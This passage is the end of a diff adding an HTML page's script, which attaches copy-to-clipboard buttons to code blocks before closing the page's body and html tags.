+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
